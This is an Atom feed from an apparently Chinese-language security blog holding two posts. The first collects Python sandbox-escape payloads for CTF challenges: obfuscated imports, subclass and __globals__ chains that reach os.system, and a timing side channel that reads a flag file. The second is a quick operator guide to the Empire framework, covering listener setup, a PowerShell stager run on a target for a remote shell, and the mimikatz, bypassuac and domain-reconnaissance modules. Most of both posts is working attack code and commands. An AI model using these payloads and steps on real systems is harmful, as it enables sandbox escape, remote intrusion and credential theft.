<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-11-05T16:49:01.010Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python SandBox Bypass</title>
    <link href="http://yoursite.com/2017/10/22/Python-SandBox-Bypass/"/>
    <id>http://yoursite.com/2017/10/22/Python-SandBox-Bypass/</id>
    <published>2017-10-22T13:11:15.000Z</published>
    <updated>2017-11-05T16:49:01.010Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-shell执行函数"><a href="#0x00-shell执行函数" class="headerlink" title="0x00 shell执行函数"></a>0x00 shell执行函数</h4><pre><code>os.system(&apos;whoami&apos;)
os.popen(&apos;whoami&apos;).read()
commands.getoutput(&apos;whoami&apos;)
commands.getstatusoutput(&apos;whoami&apos;)
subprocess.call([&apos;whoami&apos;],shell=True)
</code></pre><h4 id="0x01-Bypass敏感包过滤"><a href="#0x01-Bypass敏感包过滤" class="headerlink" title="0x01 Bypass敏感包过滤"></a>0x01 Bypass敏感包过滤</h4><p>过滤函数:</p>
<pre><code>banned = [
&quot;os&quot;,
&quot;subprocess&quot;,
&quot;sys&quot;,
&quot;commands&quot;
]
while 1:
    x=raw_input(&apos;&gt;&gt;&gt;&apos;)
    if len([i for i in banned if i not in x])==4:
        try:
            exec(x)
        except:
            print(&apos;exec error&apos;)
    else:
        print(&apos;error&apos;)
</code></pre><p>bypass:</p>
<pre><code>__import__(&quot;o&quot;+&quot;s&quot;).system(&apos;whoami&apos;)
__import__(&quot;bf&quot;.decode(&apos;rot_13&apos;)).system(&quot;whoami&quot;)
</code></pre><p>如果知道目录的话还可以直接使用execfile直接导入包,例如:</p>
<pre><code>execfile(&apos;/usr/lib/python2.7/o&apos;+&apos;s.py&apos;);system(&apos;whoami&apos;)
</code></pre><h4 id="0x02-内置类型对象"><a href="#0x02-内置类型对象" class="headerlink" title="0x02 内置类型对象"></a>0x02 内置类型对象</h4><p>过滤函数:</p>
<pre><code>from __future__ import print_function

print(&quot;Welcome to my Python sandbox! Enter commands below!&quot;)

banned = [  
    &quot;import&quot;,
    &quot;exec&quot;,
    &quot;eval&quot;,
    &quot;pickle&quot;,
    &quot;os&quot;,
    &quot;subprocess&quot;,
    &quot;kevin sucks&quot;,
    &quot;input&quot;,
    &quot;banned&quot;,
    &quot;cry sum more&quot;,
    &quot;sys&quot;
]

targets = list(__builtins__.__dict__.keys())  
targets.remove(&apos;input&apos;)  
targets.remove(&apos;print&apos;)  
exec_ = exec
for x in targets:  
    del __builtins__.__dict__[x]

while 1:
    try:  
        print(&quot;&gt;&gt;&gt;&quot;, end=&apos; &apos;)
        data = input()

        for no in banned:
            if no.lower() in data.lower():
                print(&quot;[-] &quot; + no)
                break
        else: # this means nobreak
            exec_(data)
    except:
        print(&apos;[+]error!!!!&apos;)
</code></pre><p>查找对应module:</p>
<pre><code>[m for m in [i for i in [].__class__.__base__.__subclasses__() if &apos;&lt;class&apos; in str(i) and &apos;__globals__&apos; in dir(i.__init__)] if &apos;system&apos; in [n for n in m.__init__.__globals__.keys()]]
</code></pre><p>python3.5.2返回:</p>
<pre><code>[&lt;class &apos;os._wrap_close&apos;&gt;, &lt;class &apos;os._DummyDirEntry&apos;&gt;]
</code></pre><p>shell:</p>
<pre><code>[c for c in [].__class__.__base__.__subclasses__() if c.__name__ == &apos;_DummyDirEntry&apos;][0].__init__.__globals__[&apos;sy&apos;+&apos;stem&apos;](&apos;whoami&apos;)
</code></pre><p>合成一句就是:</p>
<pre><code>[c for c in [].__class__.__base__.__subclasses__() if c.__name__ == [m.__name__ for m in [i for i in [].__class__.__base__.__subclasses__() if &apos;&lt;class&apos; in str(i) and &apos;__globals__&apos; in dir(i.__init__)] if &apos;system&apos; in [n for n in m.__init__.__globals__.keys()]][0]][0].__init__.__globals__[&apos;sy&apos;+&apos;stem&apos;](&apos;whoami&apos;)
</code></pre><p>可读性比较差了…</p>
<p>这里这个这道题我是用sys先读出了他的python版本号(因为也删除了<code>str()</code>),再用对应的内置对象getshell.</p>
<h4 id="0x03-Another-Way"><a href="#0x03-Another-Way" class="headerlink" title="0x03 Another Way"></a>0x03 Another Way</h4><p>use the timeit</p>
<p>swpu2017年的ctf比赛,直接上poc:</p>
<pre><code>import timeit
z=&quot;&quot;&quot;
import time
def fuck_length(len):
    try:
        z=open(&apos;flag&apos;,&apos;r&apos;).read()
        for i in z[len]:
            time.sleep(ord(i)*0.001)
    except:
        pass
&quot;&quot;&quot;
for i in range(0,29):
    print chr(int(timeit.timeit(&apos;fuck_length({0})&apos;.format(i),number=1,setup=z)*1000)),
</code></pre><h4 id="0x04-links"><a href="#0x04-links" class="headerlink" title="0x04 links"></a>0x04 links</h4><pre><code>http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates
http://www.cnblogs.com/iamstudy/articles/python_eval_and_bypass_sandbox_study.html
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-shell执行函数&quot;&gt;&lt;a href=&quot;#0x00-shell执行函数&quot; class=&quot;headerlink&quot; title=&quot;0x00 shell执行函数&quot;&gt;&lt;/a&gt;0x00 shell执行函数&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;os.system(&amp;apo
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Empire 速食指南</title>
    <link href="http://yoursite.com/2017/08/17/test/"/>
    <id>http://yoursite.com/2017/08/17/test/</id>
    <published>2017-08-17T14:51:01.000Z</published>
    <updated>2017-08-17T15:47:17.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-install"><a href="#0x00-install" class="headerlink" title="0x00 install"></a>0x00 install</h4><pre><code>git clone https://github.com/EmpireProject/Empire.git
./setup/install.sh
</code></pre><h4 id="0x01-quick-start"><a href="#0x01-quick-start" class="headerlink" title="0x01 quick start"></a>0x01 quick start</h4><p>安装完成之后<code>./empire</code>即可运行Empire<br>建立一个监听:</p>
<pre><code>listeners
uselistener http
set Name Empire
set Host http://192.168.2.131:1080
execute
</code></pre><p>再返回主菜单(main)生成stager:</p>
<pre><code>usestager windows/dll
set Listener Empire
execute
launcher powershell Empire
</code></pre><p>将生成的powershell命令在目标机器上执行即可拿到一个shell,<code>agents</code>命令可查看上线主机,<code>interact NAME</code>可以获得一个交互的shell</p>
<h4 id="0x02-something-others"><a href="#0x02-something-others" class="headerlink" title="0x02 something others"></a>0x02 something others</h4><p>你懂的</p>
<pre><code>mimikatz
bypassuac
</code></pre><p>上传下载</p>
<pre><code>download
upload
</code></pre><p>导入执行powershell:</p>
<pre><code>scriptimport
scriptcmd
</code></pre><p>some module</p>
<pre><code>situational_awareness/network/powerview/get_user (获取用户信息)
powershell/situational_awareness/network/powerview/user_hunter(查看有记录的当前域的所有与管理员的机器)
powershell/situational_awareness/network/powerview/get_localgroup(检测administrator群组用户）
</code></pre><p>使用<code>searchmodule</code>可以查看模块的说明,模块比较多,就不一一说明了</p>
<h3 id="0x03-the-end"><a href="#0x03-the-end" class="headerlink" title="0x03 the end"></a>0x03 the end</h3><p>我觉得我还是喜欢msf多一些</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-install&quot;&gt;&lt;a href=&quot;#0x00-install&quot; class=&quot;headerlink&quot; title=&quot;0x00 install&quot;&gt;&lt;/a&gt;0x00 install&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;git clone https://gith
    
    </summary>
    
    
  </entry>
  
</feed>
